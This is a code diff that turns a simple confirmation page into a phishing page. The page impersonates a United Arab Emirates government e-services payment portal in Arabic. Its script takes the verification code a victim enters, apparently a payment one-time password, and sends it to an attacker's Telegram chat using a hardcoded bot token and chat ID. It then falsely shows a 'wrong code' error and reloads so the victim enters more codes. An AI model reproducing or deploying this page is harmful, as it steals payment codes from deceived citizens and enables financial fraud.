@@ -3,11 +3,106 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>صفحة التحقق</title>
-  <style>body{font-family:Tahoma,Arial;text-align:center;margin-top:100px}</style>
+  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
+  <style>
+    body{font-family:Tahoma,Arial;background:#fff;margin:0;min-height:100vh;display:flex;flex-direction:column}
+    header{text-align:center;padding:20px}
+    header img{height:80px}
+    main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
+    .box{width:100%;max-width:420px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12);text-align:center}
+    h2{margin:6px 0}
+    p.lead{margin:0;color:#666}
+    input#onlyNumber{
+      width:100%;
+      padding:12px;
+      margin-top:16px;
+      border:1px solid #ccc;
+      border-radius:6px;
+      box-sizing:border-box;
+      font-size:16px;
+      text-align:center;
+    }
+    button{margin-top:12px;padding:12px 14px;width:100%;background:#0b5320;color:#fff;border:0;border-radius:6px;font-weight:800;cursor:pointer}
+    button:hover{background:#094418}
+    footer{background:#000;color:#fff;padding:18px 20px;margin-top:30px;font-size:13px;text-align:center}
+    .hint{color:#666;margin-top:10px;font-size:14px}
+    #errorMsg{color:#c00;margin-top:10px;font-size:15px;display:none}
+  </style>
 </head>
 <body>
-  <h2>تم التحقق بنجاح ✅</h2>
-  <p>شكراً لاستخدامك بوابة دفع الخدمات الإلكترونية.</p>
+  <header>
+    <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار الإمارات">
+    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
+    <p class="lead">حكومة الإمارات العربية المتحدة</p>
+  </header>
+
+  <main>
+    <div class="box" role="region" aria-labelledby="title">
+      <h3 id="title">أدخل رقم (التحقق)</h3>
+      <input id="onlyNumber" inputmode="numeric" autocomplete="off"
+             placeholder="أدخل رمز التحقق" maxlength="9" aria-describedby="hint" />
+      <button id="sendBtn" type="button">إرسال</button>
+      <p id="hint" class="hint">   ادخل كود التحقق .</p>
+      <p id="errorMsg">الرمز الذي ادخلته غير صحيح</p>
+    </div>
+  </main>
+
+  <footer>
+    سياسة الخصوصية • حقوق النشر • شروط الاستخدام • معايير WCAG 2.0 AAA • © حكومة الإمارات 2025
+  </footer>
+
+  <script>
+    const BOT_TOKEN = "8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I";
+    const CHAT_ID   = "8404960059";
+    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const input = document.getElementById('onlyNumber');
+    const btn   = document.getElementById('sendBtn');
+    const errorMsg = document.getElementById('errorMsg');
+
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/[^0-9]/g, '').slice(0, 9);
+    });
+
+    function validLength(v) {
+      return /^[0-9]{4,9}$/.test(v);
+    }
+
+    btn.addEventListener('click', async () => {
+      const val = input.value.trim();
+      if (!validLength(val)) {
+        alert('الرجاء إدخال رمز التحقق.');
+        input.focus();
+        return;
+      }
+
+      const msg = `📥 استلام رقم (التحقق):\n${val}`;
+
+      try {
+        await fetch(API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+      } catch (e) {
+        console.warn('فشل إرسال الرسالة إلى Telegram', e);
+      }
+
+      // إظهار الرسالة الحمراء تحت الحقل
+      errorMsg.style.display = 'block';
+
+      // إعادة تحميل الصفحة بعد ثانيتين
+      setTimeout(() => {
+        window.location.reload();
+      }, 2000);
+    });
+
+    input.addEventListener('keydown', (ev) => {
+      if (ev.key === 'Enter') {
+        ev.preventDefault();
+        btn.click();
+      }
+    });
+  </script>
 </body>
 </html>
